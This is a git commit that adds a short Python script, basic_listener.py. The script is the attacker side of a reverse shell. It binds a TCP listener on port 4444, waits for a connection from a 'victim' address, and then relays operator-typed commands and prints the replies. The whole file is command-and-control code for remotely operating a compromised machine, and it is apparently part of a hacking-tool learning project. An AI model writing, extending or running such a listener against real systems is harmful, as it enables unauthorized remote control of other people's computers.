a130e5205e76a1fba2f01a975fdb191f7ee4247e
Kshitij Kumar <ksh09itij@gmail.com>
2020-10-17 01:32:51 +0530

    basic listener added

---
+++ basic_listener.py
@@ -0,0 +1,15 @@
+import socket
+
+listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+listener.bind(("10.0.1.12",4444))  # set it as per your requirements
+listener.listen(0)
+print("[+]Waiting for incoming connections....")
+connection,vic_address=listener.accept()
+print("[+]Got a connection from"+str(vic_address))
+
+while True:
+    command = input(">>")
+    connection.send(command)
+    result=connection.recv(1024)
+    print(result)
